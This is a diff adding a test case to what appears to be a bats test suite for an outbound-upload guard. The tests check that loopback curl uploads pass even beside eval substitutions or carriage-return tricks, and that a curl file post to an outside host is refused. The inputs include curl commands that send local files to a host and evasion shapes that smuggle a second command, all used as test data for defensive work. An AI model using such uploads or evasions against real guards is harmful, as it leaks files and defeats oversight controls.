@@ -417,6 +417,12 @@ passes() {
     "parallel 'curl -F f=@{} http://127.0.0.1:5183/u' ::: a.json"
 }
 
+@test "a loopback curl beside an eval of a substitution, a substituted command or a CR line passes" {
+  passes 'eval "$(bin/team-stack env)"; curl -s http://127.0.0.1:5183/u' 'eval "$(bin/team-stack env)"; curl -d @x http://127.0.0.1:5183/u' \
+    '$(command -v curl) -d @x http://127.0.0.1:5183/u' $'ls\r\ncurl -d @x http://127.0.0.1:5183/u'
+  refuses "$UPLOAD" 'eval "$(bin/team-stack env)"; curl -d @x https://example.invalid/u'
+}
+
 @test "a curl upload fails closed when bin/lib/outbound.py cannot decide" {
   local python
   python=$(command -v python3)
